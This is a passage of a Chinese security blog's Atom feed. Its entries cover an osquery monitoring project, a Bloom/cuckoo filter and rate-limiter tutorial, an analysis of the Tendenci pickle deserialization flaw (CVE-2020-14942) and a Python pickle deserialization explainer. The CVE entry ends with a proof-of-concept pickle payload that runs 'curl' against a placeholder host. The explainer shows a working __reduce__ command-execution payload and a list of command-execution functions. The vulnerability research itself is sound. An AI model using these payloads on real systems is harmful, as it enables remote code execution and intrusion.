&lt;p&gt;访问首页是一个命令行执行页面，其实也没多大用，就是输出命令显示相关的东西。随便输入一个地址报错，显示是一个wordpress的站点，4.3.1的版本。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://10.10.1
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>又叒叒一个基于osquery的监控</title>
    <link href="/2020/07/%E5%8F%88%E5%8F%92%E5%8F%92%E4%B8%80%E4%B8%AA%E5%9F%BA%E4%BA%8Eosquery%E7%9A%84%E7%9B%91%E6%8E%A7/"/>
    <id>/2020/07/又叒叒一个基于osquery的监控/</id>
    <published>2020-07-02T07:54:01.000Z</published>
    <updated>2020-07-02T07:58:23.235Z</updated>
    
    <content type="html"><![CDATA[<h3 id="又叒叒一个基于osquery的监控"><a href="#又叒叒一个基于osquery的监控" class="headerlink" title="又叒叒一个基于osquery的监控"></a>又叒叒一个基于osquery的监控</h3><p>项目地址：<a href="https://github.com/MisakiKata/zeru" target="_blank" rel="noopener">https://github.com/MisakiKata/zeru</a></p><p>此项目是基于osquery的数据收集分析项目，用来监控主机，从最初的学习项目到现在的具有一定使用价值的项目。</p><p>数据流使用kafka来传输，客户端定时收集发送，服务的定时拉取，所以并没有实时监控。</p><p>基于osquery的项目官方有很多推荐，至于自己写一方面是为了学习django，一方面是为了二次开发。如果需要更完善和美观的项目可以采用官方的推荐。</p><h4 id="osquery配置"><a href="#osquery配置" class="headerlink" title="osquery配置"></a>osquery配置</h4><p>以下配置只是用来表示文件监控的一部分，至于其他的配置并没有使用。<code>/etc/osquery/osquery.conf</code></p><pre><code>{    &quot;options&quot;: {    &quot;config_plugin&quot;:&quot;filesystem&quot;,    &quot;logger_plugin&quot;:&quot;filesystem&quot;,    &quot;logger_path&quot;:&quot;/var/log/osquery&quot;,    &quot;disable_logging&quot;:&quot;false&quot;,    &quot;schedule_splay_percent&quot;:&quot;10&quot;,    &quot;verbose&quot;:&quot;false&quot;,    &quot;pidfile&quot;:&quot;/var/osquery/osquery.pidfile&quot;,    &quot;enable_syslog&quot;: &quot;true&quot;,    &quot;worker_threads&quot;:&quot;5&quot;,    &quot;host_identifier&quot;:&quot;hostname&quot;,    &quot;disable_events&quot;:&quot;false&quot;,    &quot;disable_audit&quot;:&quot;false&quot;,    &quot;audit_allow_config&quot;:&quot;true&quot;,    &quot;audit_allow_sockets&quot;:&quot;true&quot;    },    &quot;file_paths&quot;: {        &quot;html&quot;: [            &quot;/var/www/%%&quot;        ]    },    &quot;schedule&quot;: {        &quot;file_events&quot;: {            &quot;query&quot;: &quot;SELECT * FROM file_events;&quot;,            &quot;removed&quot;: false,            &quot;interval&quot;: 600        }    }}</code></pre><h4 id="kafka"><a href="#kafka" class="headerlink" title="kafka"></a>kafka</h4><p>配置根据官方推荐来即可，如果不在同一台主机，需要注意跨主机访问的配置。</p><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>默认django的非debug模式，需要开启监控，到设置中上面的选择开启即可。如果有问题可以先关闭再调试。agent目录为客户端文件，定时运行即可。默认定时为十分钟拉取一次，需要修改到<code>apps/threat/views.py</code>修改即可。</p><p>需要主机的IP做处理，所以最好先定义agent中的IP地址。如果不定义会自己识别，但不一定正确。</p><p>系统信息中会显示全部存在的信息，为了避免大量数据加载，所以只默认显示最近七天的数据。如果需要修改时间，可以到<code>apps/logcat/views.py</code>中修改。</p><h4 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h4><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200702135635.png" alt="image-20200702135628638"></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200702140400.png" alt="image-20200702140400754"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;又叒叒一个基于osquery的监控&quot;&gt;&lt;a href=&quot;#又叒叒一个基于osquery的监控&quot; class=&quot;headerlink&quot; title=&quot;又叒叒一个基于osquery的监控&quot;&gt;&lt;/a&gt;又叒叒一个基于osquery的监控&lt;/h3&gt;&lt;p&gt;项目地址：&lt;a hr
      
    
    </summary>
    
    
      <category term="Open Source Security" scheme="/tags/Open-Source-Security/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-14942-Python Tendenci Unserialize</title>
    <link href="/2020/06/CVE-2020-14942-Python-Tendenci-Unserialize/"/>
    <id>/2020/06/CVE-2020-14942-Python-Tendenci-Unserialize/</id>
    <published>2020-06-22T01:45:58.000Z</published>
    <updated>2020-06-22T01:47:37.485Z</updated>
    
    <content type="html"><![CDATA[<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>来自一个开源协会管理系统，文件<code>tendenci\apps\helpdesk\views\staff.py</code></p><pre><code class="python">def ticket_list(request):    context = {}    ......    if request.GET.get(&#39;saved_query&#39;, None):            from_saved_query = True            try:                saved_query = SavedSearch.objects.get(pk=request.GET.get(&#39;saved_query&#39;))            except SavedSearch.DoesNotExist:                return HttpResponseRedirect(reverse(&#39;helpdesk_list&#39;))            if not (saved_query.shared or saved_query.user == request.user):                return HttpResponseRedirect(reverse(&#39;helpdesk_list&#39;))            import pickle            from base64 import b64decode            query_params = pickle.loads(b64decode(str(saved_query.query).encode()))        elif not (  &#39;queue&#39; in request.GET                or  &#39;assigned_to&#39; in request.GET                or  &#39;status&#39; in request.GET                or  &#39;q&#39; in request.GET                or  &#39;sort&#39; in request.GET                or  &#39;sortreverse&#39; in request.GET                    ):</code></pre><p>从上面代码看出，这是一个从views中获取参数<code>saved_query</code>，通过id判断请求的用户和数据所属用户身份，正确后反序列化其中的query值，那么这个数据库是如下，保存的是一个文本字段。</p><pre><code class="python">class SavedSearch(models.Model):    ......    query = models.TextField(        _(&#39;Search Query&#39;),        help_text=_(&#39;Pickled query object. Be wary changing this.&#39;),        )</code></pre><p>如何去处理这个字段的值，在上个文件中，找到保存的处理方法。从post中获取<code>query_encoded</code>，判断不为空则直接保存进数据库。</p><pre><code class="python">def save_query(request):    title = request.POST.get(&#39;title&#39;, None)    shared = request.POST.get(&#39;shared&#39;, False) in [&#39;on&#39;, &#39;True&#39;, True, &#39;TRUE&#39;]    query_encoded = request.POST.get(&#39;query_encoded&#39;, None)    if not title or not query_encoded:        return HttpResponseRedirect(reverse(&#39;helpdesk_list&#39;))    query = SavedSearch(title=title, shared=shared, query=query_encoded, user=request.user)    query.save()</code></pre><p>那么如何调用的，同样去搜索关键词<code>save_query</code>找到路由，找到对应的name为<code>helpdesk_savequery</code>，找到对应的前端表单</p><pre><code>&lt;form method=&#39;post&#39; action=&#39;{% url 'helpdesk_savequery' %}&#39;&gt;    &lt;input type=&#39;hidden&#39; name=&#39;query_encoded&#39; value=&#39;{{ urlsafe_query }}&#39; /&gt;    &lt;dl&gt;        &lt;dt&gt;&lt;label for=&#39;id_title&#39;&gt;{% trans "Query Name" %}&lt;/label&gt;&lt;/dt&gt;        &lt;dd&gt;&lt;input type=&#39;text&#39; name=&#39;title&#39; id=&#39;id_title&#39; /&gt;&lt;/dd&gt;        &lt;dd class=&#39;form_help_text&#39;&gt;{% trans "This name appears in the drop-down list of saved queries. If you share your query, other users will see this name, so choose something clear and descriptive!" %}&lt;/dd&gt;        &lt;dt&gt;&lt;label for=&#39;id_shared&#39;&gt;{% trans "Shared?" %}&lt;/label&gt;&lt;/dt&gt;        &lt;dd&gt;&lt;input type=&#39;checkbox&#39; name=&#39;shared&#39; id=&#39;id_shared&#39; /&gt; {% trans "Yes, share this query with other users." %}&lt;/dd&gt;        &lt;dd class=&#39;form_help_text&#39;&gt;{% trans "If you share this query, it will be visible by <em>all</em> other logged-in users." %}&lt;/dd&gt;    &lt;/dl&gt;    &lt;div class=&#39;buttons&#39;&gt;        &lt;input class=&quot;btn btn-primary&quot; type=&#39;submit&#39; value=&#39;{% trans "Save Query" %}&#39;&gt;    &lt;/div&gt;    {% csrf_token %}&lt;/form&gt;</code></pre><p>从表单中可以看到，<code>query_encoded</code>是模板写入，找到<code>urlsafe_query</code>看是如何调用的，从调用结果看，就知道是后台先去序列化然后赋值给模板，前端模板操作的时候，再把这个序列化的值传入后台中去反序列化。</p><pre><code class="python">......    import pickle    from base64 import b64encode    urlsafe_query = b64encode(pickle.dumps(query_params)).decode()</code></pre><p>尝试构造一个反序列化的poc</p><pre><code class="python">import pickle,osfrom base64 import b64encodeclass exp(object):    def __reduce__(self):        return (os.system,(&#39;curl http://xxxx/py&#39;,))e = exp()b64encode(pickle.dumps(e))</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;反序列化&quot;&gt;&lt;a href=&quot;#反序列化&quot; class=&quot;headerlink&quot; title=&quot;反序列化&quot;&gt;&lt;/a&gt;反序列化&lt;/h4&gt;&lt;p&gt;来自一个开源协会管理系统，文件&lt;code&gt;tendenci\apps\helpdesk\views\staff.py&lt;/co
      
    
    </summary>
    
    
      <category term="python" scheme="/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python 过滤器</title>
    <link href="/2020/05/Python-%E8%BF%87%E6%BB%A4%E5%99%A8/"/>
    <id>/2020/05/Python-过滤器/</id>
    <published>2020-05-27T08:08:24.000Z</published>
    <updated>2020-05-27T08:11:28.581Z</updated>
    
    <content type="html"><![CDATA[<h2 id="布隆过滤器"><a href="#布隆过滤器" class="headerlink" title="布隆过滤器"></a>布隆过滤器</h2><h3 id="什么是布隆过滤器？"><a href="#什么是布隆过滤器？" class="headerlink" title="什么是布隆过滤器？"></a>什么是布隆过滤器？</h3><p>本质上布隆过滤器( BloomFilter )是一种数据结构，比较巧妙的概率型数据结构（probabilistic data structure），特点是高效地插入和查询，可以用来告诉你 “某样东西一定不存在或者可能存在”。</p><p>相比于传统的 Set、Map 等数据结构，它更高效、占用空间更少，但是缺点是其返回的结果是概率性的，而不是确切的。</p><h3 id="布隆过滤器原理"><a href="#布隆过滤器原理" class="headerlink" title="布隆过滤器原理"></a>布隆过滤器原理</h3><p>布隆过滤器内部维护一个<code>bitArray</code>(位数组)， 开始所有数据全部置 0 。当一个元素过来时，能过多个哈希函数（hash1,hash2,hash3….）计算不同的在哈希值，并通过哈希值找到对应的<code>bitArray</code>下标处，将里面的值 0 置为 1 。 需要说明的是，布隆过滤器有一个误判率的概念，误判率越低，则数组越长，所占空间越大。误判率越高则数组越小，所占的空间越小。</p><p>下面以网址为例来进行说明, 例如布隆过滤器的初始情况如下图所示：<br><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/1534894-20191207205013684-856617678.jpg" alt="img"></p><p>现在我们需要往布隆过滤里中插入<code>baidu</code>这个url，经过3个哈希函数的计算，hash值分别为1，4，7，那么我们就需要对布隆过滤器的对应的bit位置1， 就如图下所示：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/1534894-20191207205051490-438287903.jpg" alt="img"></p><p>接下来，需要继续往布隆过滤器中添加<code>tencent</code>这个url，然后它计算出来的hash值分别3，4，8，继续往对应的bit位置1。这里就需要注意一个点， 上面两个url最后计算出来的hash值都有4，这个现象也是布隆不能确认某个元素一定存在的原因，最后如下图所示：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/1534894-20191207205113779-698386268.jpg" alt="img"></p><p>布隆过滤器的查询也很简单，例如我们需要查找<code>python</code>，只需要计算出它的hash值， 如果该值为2，4，7，那么因为对应bit位上的数据有一个不为1， 那么一定可以断言<code>python</code>不存在，但是如果它计算的hash值是1，3，7，那么就只能判断出<code>python</code>可能存在，这个例子就可以看出来， 我们没有存入<code>python</code>，但是由于其他key存储的时候返回的hash值正好将<code>python</code>计算出来的hash值对应的bit位占用了，这样就不能准确地判断出<code>python</code>是否存在。</p><p>因此， 随着添加的值越来越多， 被占的bit位越来越多， 这时候误判的可能性就开始变高，如果布隆过滤器所有bit位都被置为1的话，那么所有key都有可能存在， 这时候布隆过滤器也就失去了过滤的功能。至此，选择一个合适的过滤器长度就显得非常重要。</p><p>从上面布隆过滤器的实现原理可以看出，它不支持删除， 一旦将某个key对应的bit位置0，可能会导致同样bit位的其他key的存在性判断错误。</p><h3 id="如何在python中使用布隆过滤器"><a href="#如何在python中使用布隆过滤器" class="headerlink" title="如何在python中使用布隆过滤器"></a>如何在python中使用布隆过滤器</h3><ol><li><p>先去这个网站下载<code>bitarray</code>这个依赖 <code>https://www.lfd.uci.edu/~gohlke/pythonlibs/#bitarray</code></p><p>直接安装会报错<code>error: Microsoft Visual C++ 14.0 is required. Get it with &quot;Build Tools for Visual Studio&quot;: https://visualstudio.microsoft.com/downloads/</code></p></li><li><p>安装<code>wheel</code>文件, 防止我们主动安装报这样的错误<code>pip3 install bitarray-1.1.0-cp36-cp36m-win_amd64.whl</code></p></li><li><p><code>pip3 install pybloom_live</code></p></li></ol><p>该模块包含两个类实现布隆过滤器功能。<code>BloomFilter</code> 是定容。<code>ScalableBloomFilter</code> 可以自动扩容</p><pre><code>import pybloom_livebloom = pybloom_live.BloomFilter(capacity=10000)  #定容一万for i in range(0, 10001):    bloom.add(i)print(len(bloom))bloom.add(10002)bloom.add(10003)print(len(bloom))</code></pre><p>当超过一万时，会提示一个越界提示，<code>IndexError: BloomFilter is at capacity</code>。看起来好像不如自动扩容的好用。对比一下定容数量和扩容数量的差别。</p><p>误判率默认是设置为千分之一，按照默认的误判率来做对比，当数量在定容内，误判率远低于设置的误判率，但数量超过定容时，准确度基本按照设置的误判率来控制。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200507094915132.png" alt="image-20200507094915132"></p><p>如果需要自动扩容来处理不确定的数量差别，可以使用<code>error_rate</code>来控制误判率。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200507095303352.png" alt="image-20200507095303352"></p><h3 id="redis-使用"><a href="#redis-使用" class="headerlink" title="redis 使用"></a>redis 使用</h3><p>docker拉取redis环境</p><pre><code>docker run -p 6379:6379 --name redis-redisbloom redislabs/rebloom:latest</code></pre><p>创建一个新过滤器</p><pre><code>106.54.181.x:6379&gt; bf.reserve newbloom 0.001 10000OK</code></pre><p>添加一个新的值，存在返回0，不存在会返回1</p><pre><code>106.54.181.x:6379&gt; bf.add name 1111(integer) 1106.54.181.x:6379&gt; bf.add name 1111(integer) 0</code></pre><p>判断值是否存在，不存在返回0，存在返回1。</p><pre><code>106.54.181.x:6379&gt; bf.exists name 1111(integer) 1106.54.181.x:6379&gt; bf.exists name 2222(integer) 0</code></pre><p>添加多个新的值</p><pre><code>106.54.181.187:6379&gt; bf.madd name 2222  33331) (integer) 12) (integer) 1</code></pre><p>使用<a href="https://github.com/RedisBloom/redisbloom-py编写一个简单的添加脚本" target="_blank" rel="noopener">https://github.com/RedisBloom/redisbloom-py编写一个简单的添加脚本</a></p><pre><code>from redisbloom.client import Clientclass _redis_bloom(object):    def __init__(self, size, error=0.001, key=&#39;name&#39;):        self.size = size        self.error = error        self.key = key        self.rb = Client(host=&#39;106.54.181.x&#39;, port=6379)        self.rb.bfCreate(self.size, self.error, self.key)        self.rb.delete(key)    def insert(self, name):        if self.rb.bfExists(self.key, name) == 0:            self.rb.bfAdd(self.key, name)            return True        else:            return Falserd = _redis_bloom(size=10000)for i in range(0, 5000):    rd.insert(i)</code></pre><h2 id="布谷鸟过滤器"><a href="#布谷鸟过滤器" class="headerlink" title="布谷鸟过滤器"></a>布谷鸟过滤器</h2><h3 id="布谷鸟过滤器-1"><a href="#布谷鸟过滤器-1" class="headerlink" title="布谷鸟过滤器"></a>布谷鸟过滤器</h3><p>布谷过滤器(cuckoo fliter)，这个名字来源于更早发表的布谷散列(cuckoo hash)，为了解决布隆过滤器不能删除的问题而出现。</p><p>采用一部分示意图说明布谷散列</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/cuckoo0.png" alt="image"></p><p>现在我们假设有一些项要存入散列表，其每个项都有其对应的两个位置，先插入第一项A</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/cuckoo_A.png" alt="image"></p><p>由于插入A的时候其两个候选位置（0,2）都没有占用，所以选择第一张表或者是第二张表都可以，我们在这里默认先选择第一张表，然后插入第二项B<br><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/cuckoo_B.png" alt="image"></p><p>我们看到原来的A的位置被B占用，而A被“踢”到它的备选位置表二的2号位置上了，这就是当发生位置冲突时，布谷散列表的处理逻辑，后来的数据项将会把之前占用的项踢到另一个位置上。我们接下来插入第三项C</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/cuckoo_C.png" alt="image"><br>没有冲突，顺利搞定，接着插入D</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/cuckoo_D.png" alt="image"><br>D成功的把C踢走了，其实看到这里读者应该在猜想，会不会有一种情况，即被踢走的数据的另一个备选位置也被占用了，这样怎么办？答案是继续踢，一个踢一个，直到大家都找到自己合适的归宿为止。</p><h3 id="布谷鸟过滤器的问题"><a href="#布谷鸟过滤器的问题" class="headerlink" title="布谷鸟过滤器的问题"></a>布谷鸟过滤器的问题</h3><p>从上面看出来，布谷鸟过滤器会让数据不停的找自己的位置，这样就会达到一个循环，比如表一某个数踢走一个到表二，表二中的数又踢走一个表一，这样会不停的循环影响效率。所以这时候布谷鸟过滤器就有一个阈值，当超过这个阈值就会说明过滤器数组满了。需要扩容，而实际并不一定满。</p><p>因为上面只设置了两个巢，所以空间利用率比较低，可能也就百分之五十左右。这时候就需要改进算法， 比如不再设置两个巢，而是较多的巢来保证可以将循环降低。</p><p>随着布谷鸟过滤器的装满，插入将变得缓慢，因为需要踢走更多的物品。如果程序对插入时间很敏感，布谷鸟过滤器并不一定适合。</p><p>另外还有一个明显的问题就是，如果插入一个数据插入了多次，就会产生自己踢自己的结果，将导致几个位置上都是同一个数据，不止如此还会提早的达到数组阈值。导致空间利用率底下。也许可以使用一次查询来解决此问题。</p><p>但是删除的时候会出现一定概率的误删。因为不同的元素被 hash 到同一个位置的可能性还是很大的，而且指纹只有一个字节，256 种可能，同一个位置出现相同的指纹可能性也很大。如果两个元素的 hash 位置相同，指纹相同，那么这个插入检查会认为它们是相等的。</p><h3 id="python实现布谷鸟过滤器"><a href="#python实现布谷鸟过滤器" class="headerlink" title="python实现布谷鸟过滤器"></a>python实现布谷鸟过滤器</h3><pre><code>pip install cuckoopy</code></pre><pre><code>from cuckoopy import CuckooFilterck = CuckooFilter(capacity=1000, bucket_size=4, fingerprint_size=1)   #每个位置四个座位，指纹字节长度为1ck.insert(&#39;hello&#39;)ck.insert(&#39;hello&#39;)ck.insert(&#39;hello&#39;)ck.insert(&#39;hello&#39;)ck.insert(&#39;hello&#39;)ck.insert(&#39;hello&#39;)ck.insert(&#39;hello&#39;)ck.insert(&#39;hello&#39;)ck.insert(&#39;hello&#39;)print(ck.contains(&#39;hello&#39;), ck.size)</code></pre><p>这种情况下，当插入同一个数据超过八次的时候，由于两个桶的八个座位都被一个数据占用，会出现循环踢的情况，超过阈值导致认为数据桶一件满了。</p><pre><code>cuckoopy.exceptions.CuckooFilterFullException: Insert operation failed. Filter is full.</code></pre><p>所以在使用布谷鸟过滤器的时候，需要先进行一次查询，如果数据存在则不在进行插入。</p><pre><code>from cuckoopy import CuckooFilterck = CuckooFilter(capacity=1000, bucket_size=4, fingerprint_size=1)   #每个位置四个座位，指纹字节长度为1ck.insert(&#39;hello&#39;)if not ck.contains(&#39;hello&#39;):    ck.insert(&#39;hello&#39;)else:    print(&quot;数据重复！&quot;)print(ck.contains(&#39;hello&#39;), ck.size)  #数据重复！ True 1</code></pre><h3 id="redis-使用-1"><a href="#redis-使用-1" class="headerlink" title="redis 使用"></a>redis 使用</h3><p>使用方式跟布隆过滤器基本一致，需要把bf改为cf即可</p><pre><code>CF.RESERVE newCuckooFilter 1000  #新建一个过滤器CF.ADD newCuckooFilter foo  #增加一个值CF.EXISTS newCuckooFilter foo  #判断是否存在CF.DEL newCuckooFilter foo  #删除</code></pre><p>同样使用上面的脚本</p><pre><code>from redisbloom.client import Clientclass _redis_cuckoo(object):    def __init__(self, size, key=&#39;name&#39;):        self.size = size        self.key = key        self.rb = Client(host=&#39;106.54.181.x&#39;, port=6379)        self.rb.cfCreate(self.key,self.size)    def insert(self, name):        if self.rb.cfExists(self.key, name) == 0:            self.rb.cfAdd(self.key, name)            return True        else:            return Falserd = _redis_cuckoo(size=10000)for i in range(0, 5000):    rd.insert(i)</code></pre><h2 id="令牌桶算法"><a href="#令牌桶算法" class="headerlink" title="令牌桶算法"></a>令牌桶算法</h2><p>令牌桶算法是网络流量整形（Traffic Shaping）和速率限制（Rate Limiting）中最常使用的一种算法。典型情况下，令牌桶算法用来控制发送到网络上的数据的数目，并允许突发数据的发送。</p><p>实现代码：<a href="https://github.com/titan-web/rate-limit/blob/master/token_bucket/__init__.py" target="_blank" rel="noopener">https://github.com/titan-web/rate-limit/blob/master/token_bucket/__init__.py</a></p><pre><code>import timefrom threading import RLock__all__ = (&quot;TokenBucket&quot;, )class TokenBucket(object):    def __init__(self, capacity, fill_rate, is_lock=False):        &quot;&quot;&quot;        :param capacity:  The total tokens in the bucket.        :param fill_rate:  The rate in tokens/second that the bucket will be refilled        &quot;&quot;&quot;        self._capacity = float(capacity)        self._tokens = float(capacity)        self._fill_rate = float(fill_rate)        self._last_time = time.time()        self._is_lock = is_lock        self._lock = RLock()    def _get_cur_tokens(self):        if self._tokens &lt; self._capacity:            now = time.time()            delta = self._fill_rate * (now - self._last_time)  # 计算从上次发送到这次发送，新发放的令牌数量            self._tokens = min(self._capacity, self._tokens + delta) # 令牌数量不能超过桶的容量            self._last_time = now        return self._tokens    def get_cur_tokens(self):        if self._is_lock:            with self._lock:                return self._get_cur_tokens()        else:            return self._get_cur_tokens()    def _consume(self, tokens):        if tokens &lt;= self.get_cur_tokens():  # 如果没有足够的令牌，则不能发送数据            self._tokens -= tokens            return True        return False    def consume(self, tokens):    #发送数据需要的令牌        if self._is_lock:            with self._lock:                return self._consume(tokens)        else:            return self._consume(tokens)</code></pre><p>调用的方式是传入需要的令牌数，比如</p><pre><code>tk = TokenBucket(capacity=10, fill_rate=10)  #容量10，每秒10个令牌while True:    if tk.consume(1):        print(&#39;1111&#39;)    else:        print(&#39;2222&#39;)        time.sleep(1)</code></pre><p>会显示如下：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200508164220582.png" alt="image-20200508164220582"></p><p>当桶内令牌又新增的时候会继续发送。</p><h2 id="漏桶算法"><a href="#漏桶算法" class="headerlink" title="漏桶算法"></a>漏桶算法</h2><p>漏桶算法(Leaky Bucket)它的主要目的是控制数据注入到网络的速率，平滑网络上的突发流量。漏桶可以看作是一个带有常量服务时间的单服务器队列，如果漏桶（包缓存）溢出，那么数据包会被丢弃。 在网络中，漏桶算法可以控制端口的流量输出速率，平滑网络上的突发流量，实现流量整形，从而为网络提供一个稳定的流量。</p><p>实现代码：<a href="https://github.com/titan-web/rate-limit/blob/master/leaky_bucket/__init__.py" target="_blank" rel="noopener">https://github.com/titan-web/rate-limit/blob/master/leaky_bucket/__init__.py</a></p><pre><code>from time import time, sleepfrom threading import RLock__all__ = (&quot;LeakyBucket&quot;, )class LeakyBucket(object):    def __init__(self, capacity, leak_rate, is_lock=False):        &quot;&quot;&quot;        :param capacity:  The total tokens in the bucket.        :param leak_rate:  The rate in tokens/second that the bucket leaks        &quot;&quot;&quot;        self._capacity = float(capacity)        self._used_tokens = 0        self._leak_rate = float(leak_rate)        self._last_time = time()        self._lock = RLock() if is_lock else None    def get_used_tokens(self):        if self._lock:            with self._lock:                return self._get_used_tokens()        else:            return self._get_used_tokens()    def _get_used_tokens(self):        now = time()        delta = self._leak_rate * (now - self._last_time)     #间隔时间新泄露的漏桶令牌数        self._used_tokens = max(0, self._used_tokens - delta)   #获取数不超过漏桶最大容量        return self._used_tokens    def _consume(self, tokens):        if tokens + self._get_used_tokens() &lt;= self._capacity:  #小于桶容量继续存储            self._used_tokens += tokens            self._last_time = time()            return True        return False    def consume(self, tokens):    #发送数据需要的令牌        if self._lock:            with self._lock:                return self._consume(tokens)        else:            return self._consume(tokens)</code></pre><p>使用类似如上的方法调用</p><pre><code>ck = LeakyBucket(capacity=20, leak_rate=5)   #桶容量20，每秒泄露5while True:    if ck.consume(1):        print(&#39;1111&#39;)    else:        print(&#39;2222&#39;)        sleep(1)</code></pre><p>结果首先把桶内的泄露完，此后每秒泄露五个。如果修改泄露数为30，这样结果任然是最多20个泄露。</p><p>参考文章：<a href="https://www.cnblogs.com/yscl/p/12003359.html" target="_blank" rel="noopener">https://www.cnblogs.com/yscl/p/12003359.html</a></p><p>​                        <a href="https://www.cnblogs.com/chuxiuhong/p/8215719.html" target="_blank" rel="noopener">https://www.cnblogs.com/chuxiuhong/p/8215719.html</a></p><p>​                        <a href="https://zhuanlan.zhihu.com/p/68418134" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/68418134</a></p><p>​                        <a href="https://www.jianshu.com/p/c02899c30bbd" target="_blank" rel="noopener">https://www.jianshu.com/p/c02899c30bbd</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;布隆过滤器&quot;&gt;&lt;a href=&quot;#布隆过滤器&quot; class=&quot;headerlink&quot; title=&quot;布隆过滤器&quot;&gt;&lt;/a&gt;布隆过滤器&lt;/h2&gt;&lt;h3 id=&quot;什么是布隆过滤器？&quot;&gt;&lt;a href=&quot;#什么是布隆过滤器？&quot; class=&quot;headerlink&quot; ti
      
    
    </summary>
    
    
      <category term="python" scheme="/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python 反序列化</title>
    <link href="/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>/2020/04/python-反序列化/</id>
    <published>2020-04-26T07:11:44.000Z</published>
    <updated>2020-05-26T08:49:23.420Z</updated>
    
    <content type="html"><![CDATA[<h2 id="反序列化库"><a href="#反序列化库" class="headerlink" title="反序列化库"></a>反序列化库</h2><p>python 序列化和反序列化使用最为频繁的是<code>cPickle</code>和<code>pickle</code>，前者是C语言实现，据说速度比后者快很多。</p><p>只不过python3标准库中不再叫<code>cPickle</code>，而是只有<code>pickle</code>。python2中两者都有。</p><p>python2中的序列化文件如果想在python3中读取，需要修改编码。</p><pre><code>#python2with open(&#39;mnist.pkl&#39;, &#39;rb&#39;) as f:    l = list(pickle.load(f))#python3with open(&#39;mnist.pkl&#39;, &#39;rb&#39;) as f:    u = pickle._Unpickler(f)    u.encoding = &#39;latin1&#39;    p = u.load()</code></pre><p>除此之外，还有一些其他的第三方序列化库，比如</p><pre><code># marshmallowpip3 install marshmallow# MessagePackpip3 install msgpack-python</code></pre><h2 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h2><h3 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h3><p>问题是序列化为什么会产生漏洞，是序列化本身处理有问题，被外来的EXP攻击导致漏洞执行了嘛。因为<code>pickle</code>允许我们用数据表示任意对象。官方也在一开始就表述问题的严重性。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200426165819294.png" alt="image-20200426165819294"></p><p><code>pickle</code>允许任意对象通过定义<code>__reduce__</code>方法来声明它是如何被压缩的，一般来说这个方法是返回一个字符串或是一个元祖。</p><pre><code>__reduce__被定义之后，当对象被Pickle时就会被调用要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用__reduce_ex__首先查看是否存在__reduce_ex__,如果存在则不再查找__reduce__，不存在的话则继续查找__reduce__</code></pre><p>利用构造一个存在漏洞的简单代码：</p><pre><code>#encoding: utf-8import osimport pickleclass test(object):    def __reduce__(self):        return (os.system,(&#39;whoami&#39;,))a=test()payload=pickle.dumps(a)print payloadpickle.loads(payload)</code></pre><p>在python2和python3的输出为：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200426171205336.png" alt="image-20200426171205336"></p><p>其中代表的含义</p><pre><code># \x80：协议头声明 \x03：协议版本# \x06\x00\x00\x00：数据长度：6  -&gt;  whoami# whoami：数据# q：储存栈顶的字符串长度：一个字节（即\x00）# \x00：栈顶位置# . ：数据截止# c：读取新的一行作为模块名module，读取下一行作为对象名object，nt -&gt;windows，posix -&gt; linux# (：将一个标记对象插入到堆栈中。# S: 实例化一个字符串对象# p：将堆栈中索引为-1的对应存储入内存。# t：构建元组压入堆栈。# R：将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象，最后将结果压入到堆栈中。</code></pre><p>如果需要在web中请求传输，url编码后就可以发送了。</p><p>如果使用的是<code>__reduce_ex__</code></p><pre><code>#encoding: utf-8import osimport pickleclass test(object):    def __init__(self, cmd):        self.cmd = cmd    def __reduce_ex__(self,cmd):        return (os.system,(self.cmd,))a=test(&#39;whoami&#39;)payload=pickle.dumps(a)print(payload)pickle.loads(payload)</code></pre><p>其中<code>pickle.loads</code>是会解决import 问题，对于未引入的module会自动尝试import。那么也就是说整个python标准库的代码执行、命令执行函数我们都可以使用。有人整理的执行命令函数。</p><pre><code>eval, execfile, compile, open, file, map, input,os.system, os.popen, os.popen2, os.popen3, os.popen4, os.open, os.pipe,os.listdir, os.access,os.execl, os.execle, os.execlp, os.execlpe, os.execv,os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe,os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe,pickle.load, 